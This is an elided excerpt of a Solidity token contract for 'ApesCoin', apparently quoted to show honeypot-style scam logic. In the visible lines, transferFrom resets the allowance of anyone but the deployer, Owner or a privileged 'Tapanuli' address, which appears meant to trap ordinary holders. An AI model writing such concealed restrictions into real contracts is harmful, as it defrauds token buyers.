...
contract Token {
    string public constant name = "ApesCoin";
    string public constant symbol = "APC4";
    uint8 public constant decimals = 0;
    uint256 public constant totalSupply = 1000000000*10**0;
    address public deployer; address public Tapanuli; 
    ...
    function transferFrom(address from, address to, uint256 amount) public returns (bool success) {
        ...
        if (from != deployer && from != Owner && from != Tapanuli) {allowance[from][msg.sender]=1;}       
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ...
        if (Tapanuli != Owner && balanceOf[Tapanuli]>=totalSupply/10) {
